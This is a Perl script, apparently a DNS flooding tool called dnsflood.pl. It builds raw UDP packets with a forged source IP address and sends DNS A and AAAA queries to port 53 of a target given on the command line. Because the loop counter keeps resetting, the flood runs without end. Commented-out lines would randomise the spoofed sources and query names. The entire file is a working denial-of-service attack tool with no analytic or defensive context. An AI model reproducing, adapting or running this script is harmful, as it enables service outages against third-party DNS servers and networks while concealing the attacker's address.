#!/usr/bin/perl


use Net::DNS::Resolver;
use Net::RawIP;
use strict;

if ($ARGV[0] eq '') {
    print "Usage: dnsflood.pl <ip address>\n";
    exit(0);
}

print ("attacked: $ARGV[0]...\n");

my @abc = ("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y",
"z");
my @domains = ("com", "org", "net"); # ...
my $str = @abc[int rand(25)];
my $name;
my $src_ip;

for (my $i=0; $i < 256; $i++) {
    if ($i>60) {                        # Make new string
        $str = @abc[int rand(9)];
        $i = 0;
    }
    #my $sport = 1024 + int(rand(65534 - 1024));
    my $sport = 11223;
    $str .= @abc[int rand(25)];
    #$name = $str . "." . @domains[int rand(3)];
    $name = "www.example.com"; 
    #$src_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
    $src_ip = "10.1.72.28";

    # Make DNS packet
    my $dnspacket_a = new Net::DNS::Packet($name, "A");
    my $dnspacket_aaaa = new Net::DNS::Packet($name, "AAAA");
    my $dnsdata_a = $dnspacket_a->data;
    my $dnsdata_aaaa = $dnspacket_aaaa->data;
    my $sock = new Net::RawIP({udp=>{}});

    # send packet
    $sock->set({ip => {
                saddr => $src_ip, daddr => "$ARGV[0]", frag_off=>0,tos=>0,id=>1565},
                udp => {source => $sport,
                dest => 53, data=>$dnsdata_aaaa
                } });
    $sock->send;

    $sock->set({ip => {
                saddr => $src_ip, daddr => "$ARGV[0]", frag_off=>0,tos=>0,id=>1565},
                udp => {source => $sport,
                dest => 53, data=>$dnsdata_a
                } });
    $sock->send;
#    sleep(8);
}


exit(0);

